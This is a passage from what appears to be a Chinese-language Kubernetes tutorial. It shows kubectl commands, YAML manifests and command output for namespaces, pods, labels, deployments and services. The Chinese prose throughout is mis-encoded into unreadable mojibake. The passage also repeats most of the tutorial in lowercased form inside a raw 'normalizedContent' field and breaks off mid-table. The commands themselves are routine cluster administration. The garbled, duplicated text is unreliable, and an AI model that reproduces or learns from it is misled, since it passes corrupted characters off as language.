æ¥çdeploymentçä¿¡æ¯\n[root@master ~]# kubectl get deploy -n dev\nNAME    READY   UP-TO-DATE   AVAILABLE   AGE\nnginx   3/3     3            3           2m42s\n\n# UP-TO-DATEï¼æååçº§çå¯æ¬æ°é\n# AVAILABLEï¼å¯ç¨å¯æ¬çæ°é\n[root@master ~]# kubectl get deploy -n dev -o wide\nNAME    READY UP-TO-DATE  AVAILABLE   AGE     CONTAINERS   IMAGES              SELECTOR\nnginx   3/3     3         3           2m51s   nginx        nginx:latest        run=nginx\n\n# æ¥çdeploymentçè¯¦ç»ä¿¡æ¯\n[root@master ~]# kubectl describe deploy nginx -n dev\nName:                   nginx\nNamespace:              dev\nCreationTimestamp:      Wed, 08 May 2021 11:14:14 +0800\nLabels:                 run=nginx\nAnnotations:            deployment.kubernetes.io/revision: 1\nSelector:               run=nginx\nReplicas:               3 desired | 3 updated | 3 total | 3 available | 0 unavailable\nStrategyType:           RollingUpdate\nMinReadySeconds:        0\nRollingUpdateStrategy:  25% max unavailable, 25% max surge\nPod Template:\n  Labels:  run=nginx\n  Containers:\n   nginx:\n    Image:        nginx:latest\n    Port:         80/TCP\n    Host Port:    0/TCP\n    Environment:  <none>\n    Mounts:       <none>\n  Volumes:        <none>\nConditions:\n  Type           Status  Reason\n  ----           ------  ------\n  Available      True    MinimumReplicasAvailable\n  Progressing    True    NewReplicaSetAvailable\nOldReplicaSets:  <none>\nNewReplicaSet:   nginx-5ff7956ff6 (3/3 replicas created)\nEvents:\n  Type    Reason             Age    From                   Message\n  ----    ------             ----   ----                   -------\n  Normal  ScalingReplicaSet  5m43s  deployment-controller  Scaled up replicaset nginx-5ff7956ff6 to 3\n  \n# å é¤,å¯¹åºçpodä¹ä¼å é¤\n[root@master ~]# kubectl delete deploy nginx -n dev\ndeployment.apps "nginx" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n\n\néç½®æä½\nåå»ºä¸ä¸ª deploy-nginx.yamlï¼åå®¹å¦ä¸ï¼\n\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  namespace: dev\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      run: nginx\n  template:\n    metadata:\n      labels:\n        run: nginx\n    spec:\n      containers:\n      - image: nginx:latest\n        name: nginx\n        ports:\n        - containerPort: 80\n          protocol: TCP\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nç¶åå°±å¯ä»¥æ§è¡å¯¹åºçåå»ºåå é¤å½ä»¤äºï¼\nåå»ºï¼kubectl create -f deploy-nginx.yaml\nå é¤ï¼kubectl delete -f deploy-nginx.yaml\n\n\n# Service\n\nç®åå·²ç»è½å¤å©ç¨ Deployment æ¥åå»ºä¸ç» Pod æ¥æä¾å·æé«å¯ç¨æ§çæå¡ãè½ç¶æ¯ä¸ª Pod é½ä¼åéä¸ä¸ªåç¬ç Pod IPï¼ç¶èå´å­å¨å¦ä¸ä¸¤é®é¢ï¼\n\n * Pod IP ä¼éç Pod çéå»ºäº§çåå\n * Pod IP ä»ä»æ¯éç¾¤åå¯è§çèæ IPï¼å¤é¨æ æ³è®¿é®\n\nè¿æ ·å¯¹äºè®¿é®è¿ä¸ªæå¡å¸¦æ¥äºé¾åº¦ãå æ­¤ï¼kubernetes è®¾è®¡äº Service æ¥è§£å³è¿ä¸ªé®é¢ã\n\nService å¯ä»¥çä½æ¯ä¸ç»åç±» Pod å¯¹å¤çè®¿é®æ¥å£ãåå© Serviceï¼åºç¨å¯ä»¥æ¹ä¾¿å°å®ç°æå¡åç°åè´è½½åè¡¡ã\n\n\n\næä½ä¸ï¼åå»ºéç¾¤åé¨å¯è®¿é®ç Service\n\n# æ´é²Service\n# expose éè¿ deploy æ¥æ¾nginx Podæ´é²\n# name æå®åç§°\n# type æå®ç±»åä¸ºéç¾¤IPï¼åªæéç¾¤åé¨å¯ä»¥è®¿é®ï¼ï¼ç±»åæå¾å¤\n# port æå® service çç«¯å£\n# target-port è½¬åå°ç®æ ç«¯å£\n[root@master ~]# kubectl expose deploy nginx --name=svc-nginx1 --type=ClusterIP --port=80 --target-port=80 -n dev\nservice/svc-nginx1 exposed\n\n# æ¥çservice\n[root@master ~]# kubectl get svc svc-nginx1 -n dev -o wide\nNAME         TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)   AGE     SELECTOR\nsvc-nginx1   ClusterIP   10.109.179.231   <none>        80/TCP    3m51s   run=nginx\n\n# è¿éäº§çäºä¸ä¸ªCLUSTER-IPï¼è¿å°±æ¯serviceçIPï¼å¨Serviceççå½å¨æä¸­ï¼è¿ä¸ªå°åæ¯ä¸ä¼åå¨ç\n# å¯ä»¥éè¿è¿ä¸ªIPè®¿é®å½åserviceå¯¹åºçPOD\n[root@master ~]# curl 10.109.179.231:80\n<!DOCTYPE html>\n<html>\n<head>\n<title>Welcome to nginx!</title>\n</head>\n<body>\n<h1>Welcome to nginx!</h1>\n.......\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\næä½äºï¼åå»ºéç¾¤å¤é¨ä¹å¯è®¿é®ç Service\nä¸é¢åå»ºç Service ç type ç±»åä¸º ClusterIPï¼è¿ä¸ª ip å°ååªç¨éç¾¤åé¨å¯è®¿é®ï¼å¦æéè¦åå»ºå¤é¨ä¹å¯ä»¥è®¿é®ç Serviceï¼éè¦ä¿®æ¹ type ä¸º NodePort\n\n[root@master ~]# kubectl expose deploy nginx --name=svc-nginx2 --type=NodePort --port=80 --target-port=80 -n dev\nservice/svc-nginx2 exposed\n\n# æ­¤æ¶æ¥çï¼ä¼åç°åºç°äºNodePortç±»åçServiceï¼èä¸æä¸å¯¹Portï¼80:31928/TCï¼\n[root@master ~]# kubectl get svc  svc-nginx2  -n dev -o wide\nNAME          TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)        AGE    SELECTOR\nsvc-nginx2    NodePort    10.100.94.0      <none>        80:31928/TCP   9s     run=nginx\n\n# æ¥ä¸æ¥å°±å¯ä»¥éè¿éç¾¤å¤çä¸»æºè®¿é® èç¹IP:31928è®¿é®æå¡äº\n# ä¾å¦å¨ççµèä¸»æºä¸éè¿æµè§å¨è®¿é®ä¸é¢çå°å\nhttp://192.168.5.4:31928/\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nå é¤ Service\n\n[root@master ~]# kubectl delete svc svc-nginx-1 -n dev service "svc-nginx-1" deleted\n\n\n1\n\n\néç½®æ¹å¼\nåå»ºä¸ä¸ª svc-nginx.yamlï¼åå®¹å¦ä¸ï¼\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: svc-nginx\n  namespace: dev\nspec:\n  # åºå®svcçåç½ipï¼å¦æä¸æå®ä¼éæºåé\n  clusterIP: 10.109.179.231 \n  ports:\n  - port: 80\n    protocol: TCP\n    targetPort: 80\n  selector:\n    run: nginx\n  type: ClusterIP\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nç¶åå°±å¯ä»¥æ§è¡å¯¹åºçåå»ºåå é¤å½ä»¤äºï¼\nåå»ºï¼kubectl create -f svc-nginx.yaml\nå é¤ï¼kubectl delete -f svc-nginx.yaml',normalizedContent:'# namespace\n\nnamespace æ¯ kubernetes ç³»ç»ä¸­çä¸ç§éå¸¸éè¦èµæºï¼å®çä¸»è¦ä½ç¨æ¯ç¨æ¥å®ç°å¤å¥ç¯å¢çèµæºéç¦»æèå¤ç§æ·çèµæºéç¦»ã\n\né»è®¤æåµä¸ï¼kubernetes éç¾¤ä¸­çææç pod é½æ¯å¯ä»¥ç¸äºè®¿é®çãä½æ¯å¨å®éä¸­ï¼å¯è½ä¸æ³è®©ä¸¤ä¸ª pod ä¹é´è¿è¡äºç¸çè®¿é®ï¼é£æ­¤æ¶å°±å¯ä»¥å°ä¸¤ä¸ª pod ååå°ä¸åç namespace ä¸ãkubernetes éè¿å°éç¾¤åé¨çèµæºåéå°ä¸åç namespace ä¸­ï¼å¯ä»¥å½¢æé»è¾ä¸ç "ç»"ï¼ä»¥æ¹ä¾¿ä¸åçç»çèµæºè¿è¡éç¦»ä½¿ç¨åç®¡çã\n\nå¯ä»¥éè¿ kubernetes çæææºå¶ï¼å°ä¸åç namespace äº¤ç»ä¸åç§æ·è¿è¡ç®¡çï¼è¿æ ·å°±å®ç°äºå¤ç§æ·çèµæºéç¦»ãæ­¤æ¶è¿è½ç»å kubernetes çèµæºéé¢æºå¶ï¼éå®ä¸åç§æ·è½å ç¨çèµæºï¼ä¾å¦ cpu ä½¿ç¨éãåå­ä½¿ç¨éç­ç­ï¼æ¥å®ç°ç§æ·å¯ç¨èµæºçç®¡çã\n\n\n\nkubernetes å¨éç¾¤å¯å¨ä¹åï¼ä¼é»è®¤åå»ºå ä¸ª namespace\n\n[root@master ~]# kubectl  get namespace\nname              status   age\ndefault           active   45h     \nkube-node-lease   active   45h  \nkube-public       active   45h     \nkube-system       active   45h    \n\n\n1\n2\n3\n4\n5\n6\n\n * default æææªæå® namespace çå¯¹è±¡é½ä¼è¢«åéå¨ default å½åç©ºé´\n * kube-node-lease éç¾¤èç¹ä¹é´çå¿è·³ç»´æ¤ï¼v1.13 å¼å§å¼å¥\n * kube-public æ­¤å½åç©ºé´ä¸çèµæºå¯ä»¥è¢«ææäººè®¿é®ï¼åæ¬æªè®¤è¯ç¨æ·ï¼\n * kube-system ææç± kubernetes ç³»ç»åå»ºçèµæºé½å¤äºè¿ä¸ªå½åç©ºé´\n\nä¸é¢æ¥ç namespace èµæºçå·ä½æä½ï¼\næ¥ç\n\n# 1 æ¥çææçns  å½ä»¤ï¼kubectl get ns\n[root@master ~]# kubectl get ns\nname              status   age\ndefault           active   45h\nkube-node-lease   active   45h\nkube-public       active   45h     \nkube-system       active   45h     \n\n# 2 æ¥çæå®çns   å½ä»¤ï¼kubectl get ns nsåç§°\n[root@master ~]# kubectl get ns default\nname      status   age\ndefault   active   45h\n\n# 3 æå®è¾åºæ ¼å¼  å½ä»¤ï¼kubectl get ns nsåç§°  -o æ ¼å¼åæ°\n# kubernetesæ¯æçæ ¼å¼æå¾å¤ï¼æ¯è¾å¸¸è§çæ¯wideãjsonãyaml\n[root@master ~]# kubectl get ns default -o yaml\napiversion: v1\nkind: namespace\nmetadata:\n  creationtimestamp: "2021-05-08t04:44:16z"\n  name: default\n  resourceversion: "151"\n  selflink: /api/v1/namespaces/default\n  uid: 7405f73a-e486-43d4-9db6-145f1409f090\nspec:\n  finalizers:\n  - kubernetes\nstatus:\n  phase: active\n  \n# 4 æ¥çnsè¯¦æ  å½ä»¤ï¼kubectl describe ns nsåç§°\n[root@master ~]# kubectl describe ns default\nname:         default\nlabels:       <none>\nannotations:  <none>\nstatus:       active  # active å½åç©ºé´æ­£å¨ä½¿ç¨ä¸­  terminating æ­£å¨å é¤å½åç©ºé´\n\n# resourcequota éå¯¹namespaceåçèµæºéå¶\n# limitrangeéå¯¹namespaceä¸­çæ¯ä¸ªç»ä»¶åçèµæºéå¶\nno resource quota.\nno limitrange resource.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\nåå»º\n\n# åå»ºnamespace\n[root@master ~]# kubectl create ns dev\nnamespace/dev created\n\n\n1\n2\n3\n\n\nå é¤\n\n# å é¤namespace\n[root@master ~]# kubectl delete ns dev\nnamespace "dev" deleted\n\n\n1\n2\n3\n\n\néç½®æ¹å¼\n\napiversion: v1\nkind: namespace\nmetadata:\n  name: dev\n\n\n1\n2\n3\n4\n\n\nç¶åå°±å¯ä»¥æ§è¡å¯¹åºçåå»ºåå é¤å½ä»¤äºï¼\nåå»ºï¼kubectl create -f ns-dev.yaml\nå é¤ï¼kubectl delete -f ns-dev.yaml\n\n\n# pod\n\npod æ¯ kubernetes éç¾¤è¿è¡ç®¡ççæå°ååï¼ç¨åºè¦è¿è¡å¿é¡»é¨ç½²å¨å®¹å¨ä¸­ï¼èå®¹å¨å¿é¡»å­å¨äº pod ä¸­ãpod å¯ä»¥è®¤ä¸ºæ¯å®¹å¨çå°è£ï¼ä¸ä¸ª pod ä¸­å¯ä»¥å­å¨ä¸ä¸ªæèå¤ä¸ªå®¹å¨ã\n\n\n\nkubernetes å¨éç¾¤å¯å¨ä¹åï¼éç¾¤ä¸­çåä¸ªç»ä»¶ä¹é½æ¯ä»¥ pod æ¹å¼è¿è¡çãå¯ä»¥éè¿ä¸é¢å½ä»¤æ¥çï¼\n\n[root@master ~]# kubectl get pod -n kube-system\nnamespace     name                             ready   status    restarts   age\nkube-system   coredns-6955765f44-68g6v         1/1     running   0          2d1h\nkube-system   coredns-6955765f44-cs5r8         1/1     running   0          2d1h\nkube-system   etcd-master                      1/1     running   0          2d1h\nkube-system   kube-apiserver-master            1/1     running   0          2d1h\nkube-system   kube-controller-manager-master   1/1     running   0          2d1h\nkube-system   kube-flannel-ds-amd64-47r25      1/1     running   0          2d1h\nkube-system   kube-flannel-ds-amd64-ls5lh      1/1     running   0          2d1h\nkube-system   kube-proxy-685tk                 1/1     running   0          2d1h\nkube-system   kube-proxy-87spt                 1/1     running   0          2d1h\nkube-system   kube-scheduler-master            1/1     running   0          2d1h\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nåå»ºå¹¶è¿è¡\nkubernetes æ²¡ææä¾åç¬è¿è¡ pod çå½ä»¤ï¼é½æ¯éè¿ pod æ§å¶å¨æ¥å®ç°ç\n\n# å½ä»¤æ ¼å¼ï¼ kubectl run (podæ§å¶å¨åç§°) [åæ°] \n# --image  æå®podçéå\n# --port   æå®ç«¯å£\n# --namespace  æå®namespace\n[root@master ~]# kubectl run nginx --image=nginx:latest --port=80 --namespace dev \ndeployment.apps/nginx created\n\n\n1\n2\n3\n4\n5\n6\n\n\næ¥ç pod ä¿¡æ¯\n\n# æ¥çpodåºæ¬ä¿¡æ¯\n[root@master ~]# kubectl get pods -n dev\nname    ready   status    restarts   age\nnginx   1/1     running   0          43s\n\n# æ¥çpodçè¯¦ç»ä¿¡æ¯\n[root@master ~]# kubectl describe pod nginx -n dev\nname:         nginx\nnamespace:    dev\npriority:     0\nnode:         node1/192.168.5.4\nstart time:   wed, 08 may 2021 09:29:24 +0800\nlabels:       pod-template-hash=5ff7956ff6\n              run=nginx\nannotations:  <none>\nstatus:       running\nip:           10.244.1.23\nips:\n  ip:           10.244.1.23\ncontrolled by:  replicaset/nginx\ncontainers:\n  nginx:\n    container id:   docker://4c62b8c0648d2512380f4ffa5da2c99d16e05634979973449c98e9b829f6253c\n    image:          nginx:latest\n    image id:       docker-pullable://nginx@sha256:485b610fefec7ff6c463ced9623314a04ed67e3945b9c08d7e53a47f6d108dc7\n    port:           80/tcp\n    host port:      0/tcp\n    state:          running\n      started:      wed, 08 may 2021 09:30:01 +0800\n    ready:          true\n    restart count:  0\n    environment:    <none>\n    mounts:\n      /var/run/secrets/kubernetes.io/serviceaccount from default-token-hwvvw (ro)\nconditions:\n  type              status\n  initialized       true\n  ready             true\n  containersready   true\n  podscheduled      true\nvolumes:\n  default-token-hwvvw:\n    type:        secret (a volume populated by a secret)\n    secretname:  default-token-hwvvw\n    optional:    false\nqos class:       besteffort\nnode-selectors:  <none>\ntolerations:     node.kubernetes.io/not-ready:noexecute for 300s\n                 node.kubernetes.io/unreachable:noexecute for 300s\nevents:\n  type    reason     age        from               message\n  ----    ------     ----       ----               -------\n  normal  scheduled  <unknown>  default-scheduler  successfully assigned dev/nginx-5ff7956ff6-fg2db to node1\n  normal  pulling    4m11s      kubelet, node1     pulling image "nginx:latest"\n  normal  pulled     3m36s      kubelet, node1     successfully pulled image "nginx:latest"\n  normal  created    3m36s      kubelet, node1     created container nginx\n  normal  started    3m36s      kubelet, node1     started container nginx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\nè®¿é® pod\n\n# è·åpodip\n[root@master ~]# kubectl get pods -n dev -o wide\nname    ready   status    restarts   age    ip             node    ... \nnginx   1/1     running   0          190s   10.244.1.23   node1   ...\n\n#è®¿é®pod\n[root@master ~]# curl http://10.244.1.23:80\n<!doctype html>\n<html>\n<head>\n\t<title>welcome to nginx!</title>\n</head>\n<body>\n\t<p><em>thank you for using nginx.</em></p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nå é¤æå® pod\n\n# å é¤æå®pod\n[root@master ~]# kubectl delete pod nginx -n dev\npod "nginx" deleted\n\n# æ­¤æ¶ï¼æ¾ç¤ºå é¤podæåï¼ä½æ¯åæ¥è¯¢ï¼åç°åæ°äº§çäºä¸ä¸ª \n[root@master ~]# kubectl get pods -n dev\nname    ready   status    restarts   age\nnginx   1/1     running   0          21s\n\n# è¿æ¯å ä¸ºå½åpodæ¯ç±podæ§å¶å¨åå»ºçï¼æ§å¶å¨ä¼çæ§podç¶åµï¼ä¸æ¦åç°podæ­»äº¡ï¼ä¼ç«å³éå»º\n# æ­¤æ¶è¦æ³å é¤podï¼å¿é¡»å é¤podæ§å¶å¨\n\n# åæ¥æ¥è¯¢ä¸ä¸å½ånamespaceä¸çpodæ§å¶å¨\n[root@master ~]# kubectl get deploy -n  dev\nname    ready   up-to-date   available   age\nnginx   1/1     1            1           9m7s\n\n# æ¥ä¸æ¥ï¼å é¤æ­¤podpodæ§å¶å¨\n[root@master ~]# kubectl delete deploy nginx -n dev\ndeployment.apps "nginx" deleted\n\n# ç¨ç­çå»ï¼åæ¥è¯¢podï¼åç°podè¢«å é¤äº\n[root@master ~]# kubectl get pods -n dev\nno resources found in dev namespace.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\néç½®æä½\nåå»ºä¸ä¸ª pod-nginx.yamlï¼åå®¹å¦ä¸ï¼\nè¿ç§åå»ºæ¹å¼ä¸ä¼å kubectl run å¨åå»º pod æ¶ä¼åå»º pod æ§å¶å¨ï¼ä»¥ä¸æ¯ä¸ä¼åå»º pod æ§å¶å¨çã\n\napiversion: v1\nkind: pod\nmetadata:\n  name: nginx\n  namespace: dev\nspec:\n  containers:\n  - image: nginx:latest\n    name: pod\n    ports:\n    - name: nginx-port\n      containerport: 80\n      protocol: tcp\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nç¶åå°±å¯ä»¥æ§è¡å¯¹åºçåå»ºåå é¤å½ä»¤äºï¼\nåå»ºï¼kubectl create -f pod-nginx.yaml\nå é¤ï¼kubectl delete -f pod-nginx.yaml\n\n\n# label\n\nlabel æ¯ kubernetes ç³»ç»ä¸­çä¸ä¸ªéè¦æ¦å¿µãå®çä½ç¨å°±æ¯å¨èµæºä¸æ·»å æ è¯ï¼ç¨æ¥å¯¹å®ä»¬è¿è¡åºååéæ©ã\n\nlabel çç¹ç¹ï¼\n\n * ä¸ä¸ª label ä¼ä»¥ key/value é®å¼å¯¹çå½¢å¼éå å°åç§å¯¹è±¡ä¸ï¼å¦ nodeãpodãservice ç­ç­\n * ä¸ä¸ªèµæºå¯¹è±¡å¯ä»¥å®ä¹ä»»ææ°éç label ï¼åä¸ä¸ª label ä¹å¯ä»¥è¢«æ·»å å°ä»»ææ°éçèµæºå¯¹è±¡ä¸å»\n * label éå¸¸å¨èµæºå¯¹è±¡å®ä¹æ¶ç¡®å®ï¼å½ç¶ä¹å¯ä»¥å¨å¯¹è±¡åå»ºåå¨ææ·»å æèå é¤\n\nå¯ä»¥éè¿ label å®ç°èµæºçå¤ç»´åº¦åç»ï¼ä»¥ä¾¿çµæ´»ãæ¹ä¾¿å°è¿è¡èµæºåéãè°åº¦ãéç½®ãé¨ç½²ç­ç®¡çå·¥ä½ã\n\n> ä¸äºå¸¸ç¨ç label ç¤ºä¾å¦ä¸ï¼\n> çæ¬æ ç­¾ï¼"version":"release", "version":"stable"......\n> ç¯å¢æ ç­¾ï¼"environment":"dev"ï¼"environment":"test"ï¼"environment":"pro"\n> æ¶ææ ç­¾ï¼"tier":"frontend"ï¼"tier":"backend"\n\næ ç­¾å®ä¹å®æ¯ä¹åï¼è¿è¦èèå°æ ç­¾çéæ©ï¼è¿å°±è¦ä½¿ç¨å° label selectorï¼å³ï¼\nlabel ç¨äºç»æä¸ªèµæºå¯¹è±¡å®ä¹æ è¯\nlabel selector ç¨äºæ¥è¯¢åç­éæ¥ææäºæ ç­¾çèµæºå¯¹è±¡\n\nå½åæä¸¤ç§ label selectorï¼\n\n * åºäºç­å¼ç label selector\n   name = slave: éæ©ææåå« label ä¸­ key="name" ä¸ value="slave" çå¯¹è±¡\n   env != production: éæ©ææåæ¬ label ä¸­ç key="env" ä¸ value ä¸ç­äº "production" çå¯¹è±¡\n * åºäºéåç label selector\n   name in (master, slave): éæ©ææåå« label ä¸­ç key="name" ä¸ value="master" æ "slave" çå¯¹è±¡\n   name not in (frontend): éæ©ææåå« label ä¸­ç key="name" ä¸ value ä¸ç­äº "frontend" çå¯¹è±¡\n\næ ç­¾çéæ©æ¡ä»¶å¯ä»¥ä½¿ç¨å¤ä¸ªï¼æ­¤æ¶å°å¤ä¸ª label selector è¿è¡ç»åï¼ä½¿ç¨éå· "," è¿è¡åéå³å¯ãä¾å¦ï¼\nname=slaveï¼env!=production\nname not in (frontend)ï¼env!=production\n\nå½ä»¤æ¹å¼\n\n# ä¸ºpodèµæºææ ç­¾\n[root@master ~]# kubectl label pod nginx-pod version=1.0 -n dev\npod/nginx-pod labeled\n\n# ä¸ºpodèµæºæ´æ°æ ç­¾\n[root@master ~]# kubectl label pod nginx-pod version=2.0 -n dev --overwrite\npod/nginx-pod labeled\n\n# æ¥çæ ç­¾\n[root@master ~]# kubectl get pod nginx-pod  -n dev --show-labels\nname        ready   status    restarts   age   labels\nnginx-pod   1/1     running   0          10m   version=2.0\n\n# ç­éæ ç­¾\n[root@master ~]# kubectl get pod -n dev -l version=2.0  --show-labels\nname        ready   status    restarts   age   labels\nnginx-pod   1/1     running   0          17m   version=2.0\n[root@master ~]# kubectl get pod -n dev -l version!=2.0 --show-labels\nno resources found in dev namespace.\n\n#å é¤æ ç­¾\n[root@master ~]# kubectl label pod nginx-pod version- -n dev\npod/nginx-pod labeled\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\néç½®æ¹å¼\n\napiversion: v1\nkind: pod\nmetadata:\n  name: nginx\n  namespace: dev\n  # åå»ºæ¶æ·»å æ ç­¾\n  labels:\n    version: "3.0" \n    env: "test"\nspec:\n  containers:\n  - image: nginx:latest\n    name: pod\n    ports:\n    - name: nginx-port\n      containerport: 80\n      protocol: tcp\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nç¶åå°±å¯ä»¥æ§è¡å¯¹åºçæ´æ°å½ä»¤äºï¼kubectl apply -f pod-nginx.yaml\n\n\n# deployment\n\nå¨ kubernetes ä¸­ï¼pod æ¯æå°çæ§å¶ååï¼ä½æ¯ kubernetes å¾å°ç´æ¥æ§å¶ podï¼ä¸è¬é½æ¯éè¿ pod æ§å¶å¨æ¥å®æçãpod æ§å¶å¨ç¨äº pod çç®¡çï¼ç¡®ä¿ pod èµæºç¬¦åé¢æçç¶æï¼å½ pod çèµæºåºç°æéæ¶ï¼ä¼å°è¯è¿è¡éå¯æéå»º podã\n\nå¨ kubernetes ä¸­ pod æ§å¶å¨çç§ç±»æå¾å¤ï¼æ¬ç« èåªä»ç»ä¸ç§ï¼deploymentã\n\n\n\nå½ä»¤æä½\n\n# å½ä»¤æ ¼å¼: kubectl run deploymentåç§°  [åæ°] \n# --image  æå®podçéå\n# --port   æå®ç«¯å£\n# --replicas  æå®åå»ºpodæ°é\n# --namespace  æå®namespace\n[root@master ~]# kubectl run nginx --image=nginx:latest --port=80 --replicas=3 -n dev\ndeployment.apps/nginx created\n\n# æ¥çåå»ºçpod\n[root@master ~]# kubectl get pods -n dev\nname                     ready   status    restarts   age\nnginx-5ff7956ff6-6k8cb   1/1     running   0          19s\nnginx-5ff7956ff6-jxfjt   1/1     running   0          19s\nnginx-5ff7956ff6-v6jqw   1/1     running   0          19s\n\n# æ¥çdeploymentçä¿¡æ¯\n[root@master ~]# kubectl get deploy -n dev\nname    ready   up-to-date   available   age\nnginx   3/3     3            3           2m42s\n\n# up-to-dateï¼æååçº§çå¯æ¬æ°é\n# availableï¼å¯ç¨å¯æ¬çæ°é\n[root@master ~]# kubectl get deploy -n dev -o wide\nname    ready up-to-date  available   age     containers   images              selector\nnginx   3/3     3         3           2m51s   nginx        nginx:latest        run=nginx\n\n# æ¥çdeploymentçè¯¦ç»ä¿¡æ¯\n[root@master ~]# kubectl describe deploy nginx -n dev\nname:                   nginx\nnamespace:              dev\ncreationtimestamp:      wed, 08 may 2021 11:14:14 +0800\nlabels:                 run=nginx\nannotations:            deployment.kubernetes.io/revision: 1\nselector:               run=nginx\nreplicas:               3 desired | 3 updated | 3 total | 3 available | 0 unavailable\nstrategytype:           rollingupdate\nminreadyseconds:        0\nrollingupdatestrategy:  25% max unavailable, 25% max surge\npod template:\n  labels:  run=nginx\n  containers:\n   nginx:\n    image:        nginx:latest\n    port:         80/tcp\n    host port:    0/tcp\n    environment:  <none>\n    mounts:       <none>\n  volumes:        <none>\nconditions:\n  type           status  reason\n  ----           ------  ------\n  available      true    minimumreplicasavailable\n  progressing    true    newreplicasetavailable\noldreplicasets:  <none>\nnewreplicaset:   nginx-5ff7956ff6 (3/3 replicas created)\nevents:\n  type    reason             age    from                   message\n  ----    ------             ----   ----                   -------\n  normal  scalingreplicaset  5m43s  deployment-controller  scaled up replicaset nginx-5ff7956ff6 to 3\n  \n# å é¤,å¯¹åºçpodä¹ä¼å é¤\n[root@master ~]# kubectl delete deploy nginx -n dev\ndeployment.apps "nginx" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n\n\néç½®æä½\nåå»ºä¸ä¸ª deploy-nginx.yamlï¼åå®¹å¦ä¸ï¼\n\napiversion: apps/v1\nkind: deployment\nmetadata:\n  name: nginx\n  namespace: dev\nspec:\n  replicas: 3\n  selector:\n    matchlabels:\n      run: nginx\n  template:\n    metadata:\n      labels:\n        run: nginx\n    spec:\n      containers:\n      - image: nginx:latest\n        name: nginx\n        ports:\n        - containerport: 80\n          protocol: tcp\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nç¶åå°±å¯ä»¥æ§è¡å¯¹åºçåå»ºåå é¤å½ä»¤äºï¼\nåå»ºï¼kubectl create -f deploy-nginx.yaml\nå é¤ï¼kubectl delete -f deploy-nginx.yaml\n\n\n# service\n\nç®åå·²ç»è½å¤å©ç¨ deployment æ¥åå»ºä¸ç» pod æ¥æä¾å·æé«å¯ç¨æ§çæå¡ãè½ç¶æ¯ä¸ª pod é½ä¼åéä¸ä¸ªåç¬ç pod ipï¼ç¶èå´å­å¨å¦ä¸ä¸¤é®é¢ï¼\n\n * pod ip ä¼éç pod çéå»ºäº§çåå\n * pod ip ä»ä»æ¯éç¾¤åå¯è§çèæ ipï¼å¤é¨æ æ³è®¿é®\n\nè¿æ ·å¯¹äºè®¿é®è¿ä¸ªæå¡å¸¦æ¥äºé¾åº¦ãå æ­¤ï¼kubernetes è®¾è®¡äº service æ¥è§£å³è¿ä¸ªé®é¢ã\n\nservice å¯ä»¥çä½æ¯ä¸ç»åç±» pod å¯¹å¤çè®¿é®æ¥å£ãåå© serviceï¼åºç¨å¯ä»¥æ¹ä¾¿å°å®ç°æå¡åç°åè´è½½åè¡¡ã\n\n\n\næä½ä¸ï¼åå»ºéç¾¤åé¨å¯è®¿é®ç service\n\n# æ´é²service\n# expose éè¿ deploy æ¥æ¾nginx podæ´é²\n# name æå®åç§°\n# type æå®ç±»åä¸ºéç¾¤ipï¼åªæéç¾¤åé¨å¯ä»¥è®¿é®ï¼ï¼ç±»åæå¾å¤\n# port æå® service çç«¯å£\n# target-port è½¬åå°ç®æ ç«¯å£\n[root@master ~]# kubectl expose deploy nginx --name=svc-nginx1 --type=clusterip --port=80 --target-port=80 -n dev\nservice/svc-nginx1 exposed\n\n# æ¥çservice\n[root@master ~]# kubectl get svc svc-nginx1 -n dev -o wide\nname         type        cluster-ip       